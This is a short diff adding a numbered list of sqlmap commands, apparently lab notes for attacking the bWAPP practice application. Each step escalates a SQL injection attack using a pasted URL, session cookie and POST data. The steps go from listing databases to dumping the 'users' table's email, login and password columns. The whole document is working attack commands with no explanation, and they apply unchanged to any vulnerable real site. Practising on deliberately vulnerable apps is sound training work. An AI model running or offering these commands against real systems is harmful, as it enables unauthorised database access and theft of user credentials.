@@ -1,0 +1,6 @@
+1. sqlmap -u "paste the url" --dbs --batch
+2. sqlmap -u "paste the url" --cookie "paste from security  to SSID" --data="down line" --dbs --batch
+3. sqlmap -u "paste the url" --cookie "paste from security  to SSID" --data="down line" --current-db
+4. sqlmap -u "paste the url" --cookie "paste from security  to SSID" --data="down line" --dbs -dump --batch
+5. sqlmap -u "paste the url" --cookie "paste from security  to SSID" --data="down line" -D bwapp -T users --column --batch
+6. sqlmap -u "paste the url" --cookie "paste from security  to SSID" --data="down line" -D bwapp -T users -C email,login,password --dump
